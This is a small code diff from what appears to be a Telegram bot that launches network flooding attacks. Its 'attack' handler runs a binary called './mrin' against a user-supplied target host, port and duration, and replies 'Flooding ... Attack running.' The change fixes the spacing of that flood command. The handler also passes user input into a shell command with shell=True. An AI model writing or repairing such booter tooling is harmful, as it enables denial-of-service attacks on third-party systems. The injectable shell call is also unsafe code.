@@ -165,7 +165,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     response = "Error: Time interval must be less than 1000 seconds."
                 else:
                     response = f"Flooding: {target}:{port} for {duration}s. Attack running."
-                    full_command = f"./mrin {target} {port} {duration}1800"
+                    full_command = f"./mrin {target} {port} {duration} 1800"
                     subprocess.Popen(full_command, shell=True)
 
                     if int(user_id) not in admin_ids:
